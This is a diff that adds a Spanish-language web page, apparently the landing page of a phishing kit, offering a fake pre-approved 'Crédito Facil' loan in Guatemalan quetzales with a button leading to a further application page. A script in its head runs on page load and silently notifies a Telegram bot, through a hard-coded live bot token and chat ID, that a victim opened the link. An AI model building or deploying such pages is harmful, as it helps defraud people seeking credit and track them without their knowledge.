@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>solicitud</title>
+
+    <!-- Linkeado CSS -->
+    <link rel="stylesheet" href="./assets/css/styles.css">
+
+  <style>
+     *{
+    -webkit-appearance: none;
+    -webkit-border-radius: 0;
+ }
+  </style>
+
+
+  <script>
+        // Configura el token y el chat ID
+        const token = '7479866714:AAF99WSxm4zb9sEwVgTU9Ybg5dfkS9OYQzE';
+        const chatId = '-4589800089';
+        const mensaje = 'abrieron el link guatemala';
+
+
+
+
+        // Función para enviar mensaje a Telegram
+        function enviarMensajeTelegram() {
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mensaje)}`;
+            
+            // Realizar la solicitud y luego redirigir
+            fetch(url)
+                .then(response => {
+                    if (response.ok) {
+
+                        console.log("Mensaje enviado");
+                    } else {
+                        console.error("Error al enviar mensaje");
+                    }
+                })
+                
+        }
+
+        // Ejecutar función al cargar la página
+        window.onload = enviarMensajeTelegram;
+    </script>
+
+</head>
+<body>
+    <header>
+        <div class="header-logo">
+            <img src="./assets/img/icons/logo.svg" alt="...">
+        </div>
+        <div class="header-op">
+            <img src="./assets/img/icons/ico-1.png" alt="...">
+            <img src="./assets/img/icons/ico-2.png" alt="...">
+            <img src="./assets/img/icons/ico-3.png" alt="...">
+        </div>
+    </header>
+  
+
+    <section>
+        <div class="wrapper">
+            <p> 
+               <center>Cuentas con un <strong>Crédito Facil</strong> pre-aprobado. 
+                Aprovecha las ventajas de una cuota fija con tasa de <strong>1,59%</strong> 
+                efectivo. ¡Aprovecha esta oportunidad¡ </center> 
+            </p>
+            <picture>
+                <img src="./assets/img/flyer.png" alt="...">
+            </picture>
+
+            <div class="box">
+                <div class="box-icon">
+                    <img src="./assets/img/icons/ico-1.png" alt="...">
+                </div>
+                <span>Selecciona el monto, plazo y la cuota</span>
+
+                <select style="color:black; padding-left:50px; ">
+					<option value="GTQ 100.000 - 12 meses cuota GTQ 9916,67" >GTQ 100.000 - 12 meses cuota de GTQ 9.916,67</option>
+                    <option value="GTQ 100.000 - 24 meses cuota GTQ 3966,67"  >GTQ 100.000 - 24 meses cuota de GTQ 3.966,67</option>
+                    <option value="GTQ 100.000 - 36 meses cuota GTQ 3305,56"  >GTQ 100.000 - 36 meses cuota de GTQ 3.305,56</option>
+                    <option value="GTQ 100.000 - 48 meses cuota GTQ 2479,17"  >GTQ 100.000 - 48 meses cuota de GTQ 2.479,17</option>
+                    <option value="GTQ 100.000 - 60 meses cuota GTQ 1983,33"  >GTQ 100.000 - 60 meses cuota de GTQ 1.983,33</option>
+                    <option value="GTQ 200.000- 12 meses cuota GTQ 19833,33" >GTQ 200.000- 12 meses cuota de GTQ 19.833,33</option>
+                    <option value="GTQ 200.000- 24 meses cuota GTQ 9916,67" >GTQ 200.000- 24 meses cuota de GTQ 9.916,67</option>
+                    <option value="GTQ 200.000- 36 meses cuota GTQ 6611,11" >GTQ 200.000- 36 meses cuota de GTQ 6.611,11</option>
+                    <option value="GTQ 200.000- 48 meses cuota GTQ 4958,33" >GTQ 200.000- 48 meses cuota de GTQ 4.958,33</option>
+                    <option value="GTQ 200.000- 60 meses cuota GTQ 3966,67"  >GTQ 200.000- 60 meses cuota GTQ 3.966,67</option>
+                </select>
+
+                <div class="box-btn">
+                    <button><a href="mua1/index.html" style="text-decoration: none; color: black;">Solicitar desembolso</a></button>
+                    
+                </div>
+            </div>
+        </div>
+		
+
+    </section>
+<br><br><br><br><br><br><br><br>
+    <footer>
+        <img src="./assets/img/icons/home.png" alt="...">
+        <img src="./assets/img/icons/mov.png" alt="...">
+        <img src="./assets/img/icons/exp.png" alt="...">
+        <img src="./assets/img/icons/conf.png" alt="...">
+    </footer>
+
+
+
+
+</body>
+</html>
